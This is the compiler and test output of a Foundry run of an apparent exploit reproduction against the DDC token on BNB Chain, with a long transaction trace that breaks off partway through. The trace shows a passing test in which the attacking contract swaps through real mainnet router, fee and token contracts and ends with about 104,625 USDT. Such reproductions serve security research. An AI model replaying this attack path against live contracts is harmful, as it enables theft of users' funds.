Compiling 27 files with Solc 0.8.25
Solc 0.8.25 finished in 1.02s
Compiler run successful with warnings:
Warning (1878): SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing "SPDX-License-Identifier: <SPDX-License>" to each source file. Use "SPDX-License-Identifier: UNLICENSED" for non-open-source code. Please see https://spdx.org for more information.
Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing "SPDX-License-Identifier: <SPDX-License>" to each source file. Use "SPDX-License-Identifier: UNLICENSED" for non-open-source code. Please see https://spdx.org for more information.
--> src/test/2022-08/DDC_exp.sol

Warning (9302): Return value of low-level calls not used.
  --> src/test/2022-08/DDC_exp.sol:56:9:
   |
56 |         address(WBNB).call{value: 0.1 ether}("");
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 339.92ms (102.16µs CPU time)

Ran 1 test for src/test/2022-08/DDC_exp.sol:ContractTest
[PASS] testExploit() (gas: 943578)
Logs:
  [Start] Attacker USDT balance before exploit: 0.000000000000000000
  [End] Attacker USDT balance after exploit: 104625.384843296409807534

Traces:
  [1119578] ContractTest::testExploit()
    ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "[Start] Attacker USDT balance before exploit", val: 0, decimals: 18)
    ├─ [23731] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::fallback{value: 100000000000000000}()
    │   ├─ emit Deposit(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 100000000000000000 [1e17])
    │   └─ ← [Stop] 
    ├─ [24420] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 100000000000000000 [1e17]
    ├─ [620509] 0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125::swapExactTokensForTokens(100000000000000000 [1e17], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955, 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1661699870 [1.661e9])
    │   ├─ [9890] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [staticcall]
    │   │   ├─ [2559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [3390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [staticcall]
    │   │   ├─ [2559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [3390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   ├─ [2559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [4981] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::validateBk(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Stop] 
    │   ├─ [93279] 0x2208DcA4A9d19B1592518FA2ba27479E1945710a::getAmountsOut(100000000000000000 [1e17], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955, 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [2717] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::isWeList(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [3390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::isUsdt(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) [staticcall]
    │   │   │   ├─ [2559] 0xEfADce528668B7315887220fD539842BC6E6f964::isUsdt(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [2425] 0xf30382447Edd815b0fAA159F2716665d103D4c47::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000001da9dedbab7cc82450b000000000000000000000000000000000000000000000001ba82b95e9f13827e00000000000000000000000000000000000000000000000000000000630b8589
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [3390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::isUsdt(0x55d398326f99059fF775485246999027B3197955) [staticcall]
    │   │   │   ├─ [2559] 0xEfADce528668B7315887220fD539842BC6E6f964::isUsdt(0x55d398326f99059fF775485246999027B3197955) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::isUsdt(0x55d398326f99059fF775485246999027B3197955) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::isUsdt(0x55d398326f99059fF775485246999027B3197955) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [5656] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::f3a83fc1(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   │   ├─ [4825] 0xEfADce528668B7315887220fD539842BC6E6f964::f3a83fc1(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [717] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::isWeList(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [10381] 0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C::calcFee(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, 0, 27289702689650756516 [2.728e19]) [staticcall]
    │   │   │   ├─ [3041] 0xE932fB810dad56d2aE5a9c52114e7992ADDC9b53::calcFee(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, 0, 27289702689650756516 [2.728e19]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000012efa0001e21fd61
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000012efa0001e21fd61
    │   │   ├─ [2425] 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000020c6c356f01d4eec87ee7000000000000000000000000000000000000000000001750dc85512ebb18880000000000000000000000000000000000000000000000000000000000630b870c
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [717] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::isWeList(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [5174] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::calDeductFee(0, 581226722624428439254 [5.812e20]) [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001c5b86ea47ba32f7c0
    │   │   ├─ [3390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::isUsdt(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1) [staticcall]
    │   │   │   ├─ [2559] 0xEfADce528668B7315887220fD539842BC6E6f964::isUsdt(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000016345785d8a00000000000000000000000000000000000000000000000000017ab880025aa7cba400000000000000000000000000000000000000000000001f822420c1798df6d6
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::isUsdt(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::isUsdt(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [8225] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xf30382447Edd815b0fAA159F2716665d103D4c47, 100000000000000000 [1e17])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xf30382447Edd815b0fAA159F2716665d103D4c47, value: 100000000000000000 [1e17])
    │   │   └─ ← [Return] true
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [236859] 0xf30382447Edd815b0fAA159F2716665d103D4c47::swap(27289702689650756516 [2.728e19], 0, 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, 0x, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─ [3433] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::isRouter(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125) [staticcall]
    │   │   │   ├─ [2602] 0xEfADce528668B7315887220fD539842BC6E6f964::isRouter(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::isUsdt(0x55d398326f99059fF775485246999027B3197955) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::isUsdt(0x55d398326f99059fF775485246999027B3197955) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [2383] 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0::token0() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1
    │   │   ├─ [2448] 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0::token1() [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000055d398326f99059ff775485246999027b3197955
    │   │   ├─ [383] 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0::token0() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [717] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::isWeList(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [383] 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0::token0() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1
    │   │   ├─ [1881] 0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C::calcFee(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, 0, 27289702689650756516 [2.728e19]) [staticcall]
    │   │   │   ├─ [1041] 0xE932fB810dad56d2aE5a9c52114e7992ADDC9b53::calcFee(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, 0, 27289702689650756516 [2.728e19]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000012efa0001e21fd61
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000012efa0001e21fd61
    │   │   ├─ [29971] 0x55d398326f99059fF775485246999027B3197955::transfer(0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C, 1364485134482537825 [1.364e18])
    │   │   │   ├─ emit Transfer(from: 0xf30382447Edd815b0fAA159F2716665d103D4c47, to: 0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C, value: 1364485134482537825 [1.364e18])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [137133] 0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C::92a6d507(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012efa0001e21fd610000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   │   ├─ [136290] 0xE932fB810dad56d2aE5a9c52114e7992ADDC9b53::92a6d507(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012efa0001e21fd610000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [delegatecall]
    │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1364485134482537825 [1.364e18]
    │   │   │   │   ├─ [2602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [9734] 0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F::token0() [staticcall]
    │   │   │   │   │   ├─ [2406] 0xDAdb8175036D6e9C73F32eaeCD81161Fe71A9023::token0() [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000002fd6ba48e977ff38bf9c43a9ba9dac72a1f88195
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000002fd6ba48e977ff38bf9c43a9ba9dac72a1f88195
    │   │   │   │   ├─ [36154] 0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F::getReserves() [staticcall]
    │   │   │   │   │   ├─ [35320] 0xDAdb8175036D6e9C73F32eaeCD81161Fe71A9023::getReserves() [delegatecall]
    │   │   │   │   │   │   ├─ [29681] 0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F::56f1a1c7() [staticcall]
    │   │   │   │   │   │   │   ├─ [28853] 0xDAdb8175036D6e9C73F32eaeCD81161Fe71A9023::56f1a1c7() [delegatecall]
    │   │   │   │   │   │   │   │   ├─ [2338] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::totalSupply() [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 5658108928805846538270 [5.658e21]
    │   │   │   │   │   │   │   │   ├─ [2602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0xEb1aDf8A02af7D5CF4ff6875c6fFa1340a346D86) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   │   ├─ [602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   │   ├─ [2602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0x000000000000000000000000000000000000dEaD) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   │   ├─ [2602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0x0000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000132ba08fccd9272581e
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000132ba08fccd9272581e
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000132ba08fccd9272581e00000000000000000000000000000000000000000000013a346e779b1f124b5300000000000000000000000000000000000000000000000000000000630b870c
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000132ba08fccd9272581e00000000000000000000000000000000000000000000013a346e779b1f124b5300000000000000000000000000000000000000000000000000000000630b870c
    │   │   │   │   ├─ [29846] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1198809206933490176 [1.198e18])
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1198809206933490176 [1.198e18])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ [8071] 0x55d398326f99059fF775485246999027B3197955::transfer(0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F, 1364485134482537825 [1.364e18])
    │   │   │   │   │   ├─ emit Transfer(from: 0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C, to: 0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F, value: 1364485134482537825 [1.364e18])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [26310] 0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F::sync()
    │   │   │   │   │   ├─ [25485] 0xDAdb8175036D6e9C73F32eaeCD81161Fe71A9023::sync() [delegatecall]
    │   │   │   │   │   │   ├─ [2602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x2F0908Ab762AB3a48566c8a2EdD4fA973E55CE2F) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 5797420212924817098932 [5.797e21]
    │   │   │   │   │   │   ├─ emit Sync(: 1000000000000000000 [1e18], : 5797420212924817098932 [5.797e21])
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   └─ ← [Return] 
    │   │   │   │   ├─ [602] 0x2fD6ba48e977Ff38bF9c43A9ba9DaC72A1f88195::balanceOf(0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─  emit topic 0: 0x87901625e4a593dc7d577a4950dede9d34964f83c41a8dd560a713aad237ea58
    │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │        topic 2: 0x0000000000000000000000008672cfb5f822c38d9023c84cbbbf4471acd5c93c
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000012efa0001e21fd610000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] 
    │   │   ├─ [8071] 0x55d398326f99059fF775485246999027B3197955::transfer(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, 25925217555168218691 [2.592e19])
